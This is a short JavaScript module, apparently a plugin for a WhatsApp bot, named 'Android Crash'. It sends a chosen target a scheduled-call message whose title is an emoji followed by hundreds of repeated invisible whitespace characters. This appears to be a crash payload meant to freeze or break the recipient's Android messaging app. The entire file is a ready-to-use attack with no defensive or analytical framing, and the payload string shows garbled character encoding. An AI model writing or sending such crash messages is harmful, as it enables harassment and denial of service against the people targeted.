const PAYLOAD = `ЁЯжДDGXeon ${'тАК '.repeat(300)}`;

export default {
  id: 'xandroid',
  name: 'Android Crash',

  async execute({ sock, target }) {
    const msg = {
      scheduledCallCreationMessage: {
        callType: '2',
        scheduledTimestampMs: `${Date.now()}`,
        title: PAYLOAD,
      },
    };

    await sock.relayMessage(target, msg, {});
  },
};
